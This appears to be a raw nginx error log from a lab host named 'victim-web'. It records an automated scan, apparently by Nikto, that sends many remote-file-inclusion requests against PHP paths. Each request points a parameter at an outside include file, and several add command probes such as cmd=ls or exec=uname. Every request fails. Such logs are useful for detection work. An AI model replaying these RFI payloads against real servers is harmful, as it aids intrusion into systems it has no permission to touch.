2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /calcul-page.php?home=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /calendar.php?cfg_dir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /calendar.php?lang=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /calendar.php?path_to_calendar=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /calendar.php?vwar_root=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /calendar.php?vwar_root=http://cirt.net/public/rfiinc.txt?&cmd=ls HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /calendar/demo/index.php?date=&v=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /calendar/payment.php?insPath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /calendario/cal_insert.php?CLASSPATH=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /calendario/cal_save.php?CLASSPATH=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /calendario/cal_saveactivity.php?CLASSPATH=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cart.php?lang_list=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cart_content.php?cart_isp_root=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /catalog/includes/include_once.php?include_file=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /catalogshop.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cdsagenda/modification/SendAlertEmail.php?AGE=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cfagcms/themes/default/index.php?main=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /ch_readalso.php?read_xml_include=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /challenge.php?vwar_root=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /challenge.php?vwar_root=http://cirt.net/public/rfiinc.txt?&cmd=ls HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /change_preferences2.php?target=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /chat.php?CONFIG[MWCHAT_Libs]=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /chat.php?my[root]=http://cirt.net/public/rfiinc.txt?cm=id HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /chat/adminips.php?banned_file=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /checkout.php?abs_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /checkout.php?abs_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /ciamos_path/modules/forum/include/config.php?module_cache_path='http://cirt.net/public/rfiinc.txt' HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /circ.php?include_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /circolari/cir_save.php?CLASSPATH=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /citywriter/head.php?path=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /cl_files/index.php?path_to_calendar=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /claroline/auth/ldap/authldap.php?includePath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /claroline/phpbb/page_tail.php?includePath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /claroline180rc1/claroline/inc/lib/import.lib.php?includePath=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /class.mysql.php?path_to_bt_dir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /class/Wiki/Wiki.php?c_node[class_path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /class/jpcache/jpcache.php?_PSL[classdir]=http://cirt.net/public/rfiinc.txt?exec=uNikto HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /class/jpcache/jpcache.php?_PSL[classdir]=http://cirt.net/public/rfiinc.txt?exec=uname HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /class/php/d4m_ajax_pagenav.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/Association.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/BigMath.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/DiffieHellman.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/DumbStore.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/Extension.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/FileStore.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/HMAC.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/MemcachedStore.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/Message.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/Nonce.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/SQLStore.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/SReg.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/TrustRoot.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/OpenID/URINorm.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/Yadis/XRDS.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/Yadis/XRI.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Auth/Yadis/XRIRes.php?_ENV[asicms][path]=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Cache.class.php?rootdir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Customer.class.php?rootdir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Performance.class.php?rootdir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Project.class.php?rootdir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/Representative.class.php?rootdir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/User.class.php?rootdir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/admin_o.php?absolutepath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/adodbt/sql.php?classes_dir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/adodbt/sql.php?classes_dir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/board_o.php?absolutepath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/class_admin.php?PathToComment=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/class_comments.php?PathToComment=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/class_mail.inc.php?path_to_folder=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/common.php?rootdir=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/core/language.php?rootdir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/dev_o.php?absolutepath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/file_o.php?absolutepath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/html/com_articles.php?absolute_path=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/phpmailer/class.cs_phpmailer.php?classes_dir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/query.class.php?baseDir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classes/tech_o.php?absolutepath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classified.php?insPath=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classified_right.php?language_dir=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /classifieds/index.php?lowerTemplate=http://cirt.net/public/rfiinc.txt HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /clear.php?bibtexrootrel=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:44 [error] 57#57: *7793 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /clearinfo.php?bibtexrootrel=http://cirt.net/public/rfiinc.txt? HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
